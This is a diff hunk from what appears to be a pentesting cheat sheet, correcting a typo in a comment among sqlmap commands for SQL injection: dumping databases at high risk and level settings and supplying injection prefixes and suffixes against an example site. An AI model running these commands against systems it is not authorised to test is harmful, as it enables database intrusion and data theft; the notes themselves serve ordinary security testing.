@@ -111,7 +111,7 @@ sqlmap -r req.txt --batch --dump --risk=3
 sqlmap -r req.txt --level=5 -v 3
 sqlmap -r req.txt --level=5 --string="Welcome" -v 3 # Check webpage for successful string!
 
-# Specifying a prefix or suffix. Test different payloads wotfor correct prefix
+# Specifying a prefix or suffix. Test different payloads for correct prefix
 sqlmap -u "www.example.com/?q=test" --prefix='%'))' --suffix='-- -'         '# May need single/double quotes for prefix/suffix...
 
 # Basic DB enumeration
